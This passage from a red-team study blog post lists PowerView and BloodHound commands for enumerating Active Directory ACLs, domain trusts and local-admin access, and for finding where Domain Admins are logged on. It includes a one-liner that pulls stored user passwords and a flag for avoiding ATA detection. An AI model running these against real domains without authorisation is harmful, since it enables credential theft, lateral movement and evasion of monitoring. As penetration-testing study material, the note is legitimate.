</span></pre></table></code></div></div><h3 id="get-the-acls-associated-with-the-specified-prefix-to-be-used-for-search"><span class="mr-2">Get the ACLs associated with the specified prefix to be used for search</span><a href="#get-the-acls-associated-with-the-specified-prefix-to-be-used-for-search" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ADSprefix</span><span class="w"> </span><span class="s1">'CN=Administrator,CN=Users'</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="we-can-also-enumerate-acls-using-activedirectory-module-but-without-resolving-guids"><span class="mr-2">We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs</span><a href="#we-can-also-enumerate-acls-using-activedirectory-module-but-without-resolving-guids" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="n">Get-Acl</span><span class="w"> </span><span class="s2">"AD:\CN=Administrator, CN=&lt;name&gt;, DC=&lt;name&gt;, DC=&lt;name&gt;,DC=local"</span><span class="p">)</span><span class="o">.</span><span class="nf">Access</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-the-acls-associated-with-the-specified-ldap-path-to-be-used-for-search"><span class="mr-2">Get the ACLs associated with the specified LDAP path to be used for search</span><a href="#get-the-acls-associated-with-the-specified-ldap-path-to-be-used-for-search" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-ADSpath</span><span class="w"> </span><span class="s2">"LDAP://CN=Domain Admins,CN=Users,DC=&lt;name&gt;,DC=&lt;name&gt;,DC=local"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="search-for-interesting-aces"><span class="mr-2">Search for interesting ACEs</span><a href="#search-for-interesting-aces" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-ACLScanner</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-the-acls-associated-with-the-specified-path"><span class="mr-2">Get the ACLs associated with the specified path</span><a href="#get-the-acls-associated-with-the-specified-path" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-PathAcl</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"\\&lt;computer-name&gt;\sysvol"</span><span class="w">
</span></pre></table></code></div></div><h3 id="find-intresting-aces-interesting-permisions-of-unexpected-objects-rid1000-and-modify-permissions-over-other-objects"><span class="mr-2">Find intresting ACEs (Interesting permisions of “unexpected objects” (RID&gt;1000 and modify permissions) over other objects</span><a href="#find-intresting-aces-interesting-permisions-of-unexpected-objects-rid1000-and-modify-permissions-over-other-objects" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="check-if-any-of-the-interesting-permissions-founds-is-realated-to-a-usernamegroup"><span class="mr-2">Check if any of the interesting permissions founds is realated to a username/group</span><a href="#check-if-any-of-the-interesting-permissions-founds-is-realated-to-a-usernamegroup" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w">
</span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"RDPUsers"</span><span class="p">}</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-special-rights-over-all-administrators-in-domain"><span class="mr-2">Get special rights over All administrators in domain</span><a href="#get-special-rights-over-all-administrators-in-domain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetGroupMember</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"Administrators"</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IsGroup</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"false"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ObjectACL</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">MemberName</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">ObjectDN</span><span class="p">,</span><span class="w"> </span><span class="nx">IdentityReference</span><span class="p">,</span><span class="w"> </span><span class="nx">ActiveDirectoryRights</span><span class="w"> 
</span></pre></table></code></div></div><h1 id="trusts-enumeration">Trusts Enumeration</h1><ul><li>In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.<li>Trust can be automatic (parent-child, same forest etc.) or established (forest, external).<li>Trusted Domain Objects (TDOs) represent the trust relationships in a domain.</ul><h2 id="powerview-enumeration-3"><span class="mr-2">PowerView Enumeration</span><a href="#powerview-enumeration-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="get-all-domain-trusts-parent-children-and-external"><span class="mr-2">Get all domain trusts (parent, children and external)</span><a href="#get-all-domain-trusts-parent-children-and-external" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetDomainTrust</span><span class="w">
</span></pre></table></code></div></div><h3 id="enumerate-all-the-trusts-of-all-the-domains-found"><span class="mr-2">Enumerate all the trusts of all the domains found</span><a href="#enumerate-all-the-trusts-of-all-the-domains-found" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetForestDomain</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-NetDomainTrust</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="enumerate-also-all-the-trusts"><span class="mr-2">Enumerate also all the trusts</span><a href="#enumerate-also-all-the-trusts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainTrustMapping</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-info-of-current-forest-no-external"><span class="mr-2">Get info of current forest (no external)</span><a href="#get-info-of-current-forest-no-external" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ForestGlobalCatalog</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-info-about-the-external-forest-if-possible"><span class="mr-2">Get info about the external forest (if possible)</span><a href="#get-info-about-the-external-forest-if-possible" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Get-ForestGlobalCatalog</span><span class="w"> </span><span class="nt">-Forest</span><span class="w"> </span><span class="nx">external.domain</span><span class="w"> 
</span><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="s2">"GC://</span><span class="si">$(</span><span class="nv">$</span><span class="nn">ENV</span><span class="p">:</span><span class="nv">USERDNSDOMAIN</span><span class="si">)</span><span class="s2">"</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-forest-trusts-it-must-be-between-2-roots-trust-between-a-child-and-a-root-is-just-an-external-trust"><span class="mr-2">Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)</span><a href="#get-forest-trusts-it-must-be-between-2-roots-trust-between-a-child-and-a-root-is-just-an-external-trust" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-NetForestTrust</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-users-with-privileges-in-other-domains-inside-the-forest"><span class="mr-2">Get users with privileges in other domains inside the forest</span><a href="#get-users-with-privileges-in-other-domains-inside-the-forest" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainForeingUser</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="get-groups-with-privileges-in-other-domains-inside-the-forest"><span class="mr-2">Get groups with privileges in other domains inside the forest</span><a href="#get-groups-with-privileges-in-other-domains-inside-the-forest" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainForeignGroupMember</span><span class="w"> 
</span></pre></table></code></div></div><h2 id="low-hanging-fruit"><span class="mr-2">Low Hanging Fruit</span><a href="#low-hanging-fruit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="check-if-any-user-passwords-are-set"><span class="mr-2">Check if any user passwords are set</span><a href="#check-if-any-user-passwords-are-set" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$FormatEnumerationLimit</span><span class="o">=</span><span class="nt">-1</span><span class="p">;</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-LDAPFilter</span><span class="w"> </span><span class="s1">'(userPassword=*)'</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">memberof</span><span class="p">,</span><span class="nx">userPassword</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span><span class="n">Add-Member</span><span class="w"> </span><span class="nt">-InputObject</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'Password'</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII.GetString</span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">userPassword</span><span class="si">)</span><span class="s2">)"</span><span class="w"> </span><span class="nt">-PassThru</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></pre></table></code></div></div><h3 id="asks-dc-for-all-computers-and-asks-every-computer-if-it-has-admin-access-it-would-be-a-bit-noisy-you-need-rcp-and-smb-ports-opened"><span class="mr-2">Asks DC for all computers, and asks every computer if it has admin access (it would be a bit noisy). You need RCP and SMB ports opened.</span><a href="#asks-dc-for-all-computers-and-asks-every-computer-if-it-has-admin-access-it-would-be-a-bit-noisy-you-need-rcp-and-smb-ports-opened" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-LocalAdminAccess</span><span class="w">
</span></pre></table></code></div></div><h3 id="this-time-you-need-to-give-the-list-of-computers-in-the-domain-do-the-same-as-before-but-trying-to-execute-a-wmi-action-in-each-computer-admin-privs-are-needed-to-do-so-useful-if-rcp-and-smb-ports-are-closed"><span class="mr-2">(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.</span><a href="#this-time-you-need-to-give-the-list-of-computers-in-the-domain-do-the-same-as-before-but-trying-to-execute-a-wmi-action-in-each-computer-admin-privs-are-needed-to-do-so-useful-if-rcp-and-smb-ports-are-closed" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\Find-WMILocalAdminAccess.ps1</span><span class="w"> </span><span class="nt">-ComputerFile</span><span class="w"> </span><span class="o">.</span><span class="nx">\computers.txt</span><span class="w">
</span></pre></table></code></div></div><h3 id="enumerate-machines-where-a-particular-usergroup-identity-has-local-admin-rights"><span class="mr-2">Enumerate machines where a particular user/group identity has local admin rights</span><a href="#enumerate-machines-where-a-particular-usergroup-identity-has-local-admin-rights" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-DomainGPOUserLocalGroupMapping</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">User/Group</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="goes-through-the-list-of-all-computers-from-dc-and-executes-get-netlocalgroup-to-search-local-admins-you-need-root-privileges-on-non-dc-hosts"><span class="mr-2">Goes through the list of all computers (from DC) and executes Get-NetLocalGroup to search local admins (you need root privileges on non-dc hosts).</span><a href="#goes-through-the-list-of-all-computers-from-dc-and-executes-get-netlocalgroup-to-search-local-admins-you-need-root-privileges-on-non-dc-hosts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-EnumerateLocalAdmin</span><span class="w">
</span></pre></table></code></div></div><h3 id="search-unconstrained-delegation-computers-and-show-users"><span class="mr-2">Search unconstrained delegation computers and show users</span><a href="#search-unconstrained-delegation-computers-and-show-users" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-DomainUserLocation</span><span class="w"> </span><span class="nt">-ComputerUnconstrained</span><span class="w"> </span><span class="nt">-ShowAll</span><span class="w">
</span></pre></table></code></div></div><h3 id="admin-users-that-allow-delegation-logged-into-servers-that-allow-unconstrained-delegation"><span class="mr-2">Admin users that allow delegation, logged into servers that allow unconstrained delegation</span><a href="#admin-users-that-allow-delegation-logged-into-servers-that-allow-unconstrained-delegation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Find-DomainUserLocation</span><span class="w"> </span><span class="nt">-ComputerUnconstrained</span><span class="w"> </span><span class="nt">-UserAdminCount</span><span class="w"> </span><span class="nt">-UserAllowDelegation</span><span class="w">
</span></pre></table></code></div></div><h3 id="get-members-from-domain-admins-default-and-a-list-of-computers-and-check-if-any-of-the-users-is-logged-in-any-machine-running-get-netsessionget-netloggedon-on-each-host-if--checkaccess-then-it-also-check-for-localadmin-access-in-the-hosts"><span class="mr-2">Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.</span><a href="#get-members-from-domain-admins-default-and-a-list-of-computers-and-check-if-any-of-the-users-is-logged-in-any-machine-running-get-netsessionget-netloggedon-on-each-host-if--checkaccess-then-it-also-check-for-localadmin-access-in-the-hosts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-UserHunter</span><span class="w"> </span><span class="nt">-CheckAccess</span><span class="w">
</span></pre></table></code></div></div><h3 id="search-rdpusers-users"><span class="mr-2">Search “RDPUsers” users</span><a href="#search-rdpusers-users" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-UserHunter</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"RDPUsers"</span><span class="w">
</span></pre></table></code></div></div><h3 id="it-will-only-search-for-active-users-inside-high-traffic-servers-dc-file-servers-and-distributed-file-servers"><span class="mr-2">It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)</span><a href="#it-will-only-search-for-active-users-inside-high-traffic-servers-dc-file-servers-and-distributed-file-servers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-UserHunter</span><span class="w"> </span><span class="nt">-Stealth</span><span class="w">
</span></pre></table></code></div></div><h1 id="bloodhound-enumeration">BloodHound Enumeration</h1><ul><li>Provides GUI for AD entities and relationships for the data collected by its ingestors.<li>Uses Graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins.<li>Source : https://github.com/BloodHoundAD/BloodHound<li>There are built-in queries for frequently used actions.<li>Also supports custom Cypher queries.</ul><h2 id="sharphound-enumeration"><span class="mr-2">SharpHound Enumeration</span><a href="#sharphound-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can use <em>SharpHound</em> to collect the data, then use <code class="language-plaintext highlighter-rouge">neo4j</code> and <code class="language-plaintext highlighter-rouge">bloodhound</code> on our local machine and load the collected data.</p><h3 id="supply-data-to-bloodhound"><span class="mr-2">Supply data to BloodHound</span><a href="#supply-data-to-bloodhound" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The generated archive can be uploaded to the BloodHound application.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\SharpHound.ps1</span><span class="w">
</span><span class="nx">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="p">,</span><span class="nx">LoggedOn</span><span class="w">
</span></pre></table></code></div></div><h3 id="to-avoid-detections-like-ata"><span class="mr-2">To avoid detections like ATA</span><a href="#to-avoid-detections-like-ata" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-ExcludeDC</span><span class="w">
</span></pre></table></code></div></div><h3 id="start-neo4j-and-bloodhound-ui-on-kali-machine-and-load-the-zipjson-files"><span class="mr-2">Start neo4j and BloodHound UI on kali machine and load the zip/json files</span><a href="#start-neo4j-and-bloodhound-ui-on-kali-machine-and-load-the-zipjson-files" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0xStarlight@kali<span class="nv">$ </span><span class="nb">sudo </span>neo4j console
0xStarlight@kali<span class="nv">$ </span>bloodhound
</pre></table></code></div></div><h1 id="references">References</h1><ol><li>Powershell Introdution from : <a href="https://tryhackme.com/room/powershell">https://tryhackme.com/room/powershell</a><li>AMSI Brief from : <a href="https://tryhackme.com/room/hololive">https://tryhackme.com/room/hololive</a></ol><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red-Teaming</a>, <a href='/categories/active-directory-offensive-powershell/'>Active-Directory-Offensive-PowerShell</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active-directory</a> <a href="/tags/active-directory-enumeration/" class="post-tag no-text-decoration" >active-directory-enumeration</a> <a href="/tags/offensive-powershell/" class="post-tag no-text-decoration" >offensive-powershell</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >powershell</a> <a href="/tags/amsi-bypass/" class="post-tag no-text-decoration" >amsi-bypass</a> <a href="/tags/real-time-monitoring-bypass/" class="post-tag no-text-decoration" >real-time-monitoring-bypass</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >bloodhound</a> <a href="/tags/trusts-enumeration/" class="post-tag no-text-decoration" >trusts-enumeration</a> <a href="/tags/gpo-enumeration/" class="post-tag no-text-decoration" >GPO-enumeration</a> <a href="/tags/acl-enumeration/" class="post-tag no-text-decoration" >ACL-enumeration</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Active Directory - Offensive PowerShell - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/Offensive-powershell/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Active Directory - Offensive PowerShell - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/Offensive-powershell/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/Offensive-powershell/&amp;text=Active Directory - Offensive PowerShell - 0xStarlight" 